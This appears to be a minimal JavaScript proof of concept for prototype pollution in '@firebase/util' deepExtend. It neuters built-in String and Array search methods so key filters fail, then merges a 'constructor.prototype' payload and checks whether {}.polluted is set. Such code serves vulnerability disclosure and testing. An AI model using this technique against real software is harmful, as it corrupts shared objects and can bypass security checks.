String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
console.log({}.polluted);
const util = require('@firebase/util');
var payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
const a = {
    nest: {
        number: 1,
        string: '1',
        object: { key: '1' },
        date: new Date(1),
        nest: { a: 1 }
    }
};
var result = util.deepExtend(a, payload);
console.log({}.polluted);